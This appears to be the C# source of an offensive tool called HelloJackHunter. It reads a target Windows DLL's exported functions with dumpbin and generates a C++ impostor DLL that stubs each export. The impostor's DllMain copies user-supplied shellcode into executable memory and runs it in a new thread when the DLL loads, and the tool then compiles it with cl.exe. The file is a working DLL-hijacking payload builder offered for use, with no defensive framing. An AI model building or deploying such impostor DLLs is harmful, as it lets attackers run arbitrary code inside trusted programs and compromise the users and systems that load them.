using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;

namespace HelloJackHunter
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("Usage: HelloJackHunter.exe <path to DLL or directory> <output path> <shellcode.bin>");
                return;
            }

            string inputPath = Path.GetFullPath(args[0]);
            string outputPath = Path.GetFullPath(args[1]);
            string shellcodePath = Path.GetFullPath(args[2]);

            if (!Directory.Exists(outputPath))
            {
                Directory.CreateDirectory(outputPath);
                Console.WriteLine($"[INFO] Created output directory: {outputPath}");
            }

            string shellcodeHex = LoadShellcode(shellcodePath);

            if (File.Exists(inputPath))
            {
                ProcessDll(Path.GetFullPath(inputPath), outputPath, shellcodeHex);
            }
            else if (Directory.Exists(inputPath))
            {
                foreach (string file in Directory.GetFiles(inputPath, "*.dll"))
                {
                    ProcessDll(file, outputPath, shellcodeHex);
                }
            }
            else
            {
                Console.WriteLine("Invalid path.");
            }
        }

        static void ProcessDll(string dllPath, string outputPath, string shellcodeHex)
        {
            dllPath = Path.GetFullPath(dllPath);
            Console.WriteLine($"[DEBUG] Processing DLL: {dllPath}");
            Console.WriteLine($"[DEBUG] Output Path: {outputPath}");

            if (!File.Exists(dllPath))
            {
                Console.WriteLine($"[ERROR] File not found: {dllPath}");
                return;
            }

            string outputFileName = Path.Combine(outputPath, Path.GetFileNameWithoutExtension(dllPath) + ".cpp");
            StringBuilder sb = new StringBuilder();

            sb.AppendLine("#include <windows.h>");
            sb.AppendLine("#include <stdio.h>");
            sb.AppendLine("#include <stdlib.h>");
            sb.AppendLine("#include <string.h>");
            sb.AppendLine("#include <pch.h>");
            sb.AppendLine();

            try
            {
                string dumpbinOutput = CallDumpbin(dllPath);
                if (string.IsNullOrWhiteSpace(dumpbinOutput))
                {
                    Console.WriteLine("[ERROR] dumpbin returned no output. Possible failure.");
                    return;
                }

                var exportedFunctions = ParseExportedFunctions(dumpbinOutput);
                Console.WriteLine($"[DEBUG] Found {exportedFunctions.Count} exported functions.");

                foreach (string functionName in exportedFunctions)
                {
                    string cppTemplate = GenerateCppTemplate(functionName);
                    sb.AppendLine(cppTemplate);
                }

                sb.AppendLine(GenerateDllMainTemplate(shellcodeHex));

                File.WriteAllText(outputFileName, sb.ToString());
                Console.WriteLine($"[INFO] Generated C++ file: {outputFileName}");

                CompileToDll(outputFileName);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[FATAL] Error processing {dllPath}: {ex.Message}");
            }
        }

        static string LocateDumpbin()
        {
            string vswhere = @"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe";
            if (!File.Exists(vswhere)) return null;

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = vswhere,
                Arguments = "-latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath",
                RedirectStandardOutput = true,
                UseShellExecute = false
            };

            using (Process p = Process.Start(psi))
            {
                string installPath = p.StandardOutput.ReadLine()?.Trim();
                if (!string.IsNullOrWhiteSpace(installPath))
                {
                    string candidate = Path.Combine(installPath, @"VC\Tools\MSVC");
                    if (Directory.Exists(candidate))
                    {
                        string[] versions = Directory.GetDirectories(candidate);
                        if (versions.Length > 0)
                        {
                            string latest = versions[0];
                            return Path.Combine(latest, @"bin\Hostx64\x64\dumpbin.exe");
                        }
                    }
                }
            }

            return null;
        }

        static string CallDumpbin(string dllPath)
        {
            string dumpbinPath = LocateDumpbin();

            if (string.IsNullOrWhiteSpace(dumpbinPath) || !File.Exists(dumpbinPath))
            {
                Console.WriteLine($"[ERROR] dumpbin not found. Make sure Visual Studio with C++ tools is installed.");
                return null;
            }

            Console.WriteLine($"[DEBUG] Running dumpbin: \"{dumpbinPath}\" /exports \"{dllPath}\"");

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = dumpbinPath,
                Arguments = $"/exports \"{dllPath}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(startInfo))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                if (!string.IsNullOrEmpty(error))
                {
                    Console.WriteLine($"[DEBUG] dumpbin stderr: {error}");
                }

                return output;
            }
        }

        static HashSet<string> ParseExportedFunctions(string dumpbinOutput)
        {
            HashSet<string> functions = new HashSet<string>();
            string[] lines = dumpbinOutput.Split('\n');
            bool exportsStart = false;

            foreach (string line in lines)
            {
                if (line.Contains("ordinal hint RVA      name"))
                {
                    exportsStart = true;
                    continue;
                }

                if (exportsStart)
                {
                    Match match = Regex.Match(line, @"\s*\d+\s+\d+\s+[A-F0-9]+\s+(\S+)");
                    if (match.Success)
                    {
                        functions.Add(match.Groups[1].Value);
                    }
                }
            }

            return functions;
        }

        static string LoadShellcode(string shellcodePath)
        {
            byte[] bytes = File.ReadAllBytes(shellcodePath);
            StringBuilder sb = new StringBuilder("unsigned char shellcode[] = {");

            for (int i = 0; i < bytes.Length; i++)
            {
                sb.Append($"0x{bytes[i]:X2}");
                if (i < bytes.Length - 1) sb.Append(", ");
            }

            sb.Append("};");
            return sb.ToString();
        }

        static string GenerateCppTemplate(string functionName)
        {
            return $@"
extern ""C"" {{
    __declspec(dllexport) void {functionName}() {{
        // Stub for exported function: {functionName}
        return;
    }}
}}";
        }

        static string GenerateDllMainTemplate(string shellcode)
        {
            return $@"
{shellcode}
DWORD WINAPI RunShellcode(LPVOID lpParameter)
{{
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!exec) return 1;
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{{
    switch (ul_reason_for_call)
    {{
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, RunShellcode, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }}
    return TRUE;
}}";
        }

        static void CompileToDll(string cppFileName)
        {
            string outputDllName = Path.ChangeExtension(cppFileName, ".dll");
            string compilerPath = @"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.37.32822\bin\Hostx64\x64\cl.exe";
            string compilerArgs = $"/LD \"{cppFileName}\" /Fe\"{outputDllName}\" /Fo\"{Path.GetDirectoryName(cppFileName)}\\";

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = compilerPath,
                Arguments = compilerArgs,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            try
            {
                using (Process process = Process.Start(startInfo))
                {
                    using (StreamReader reader = process.StandardOutput)
                    {
                        Console.WriteLine(reader.ReadToEnd());
                    }
                }

                Console.WriteLine($"[INFO] Compiled DLL: {outputDllName}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Error compiling {cppFileName}: {ex.Message}");
            }
        }
    }
}
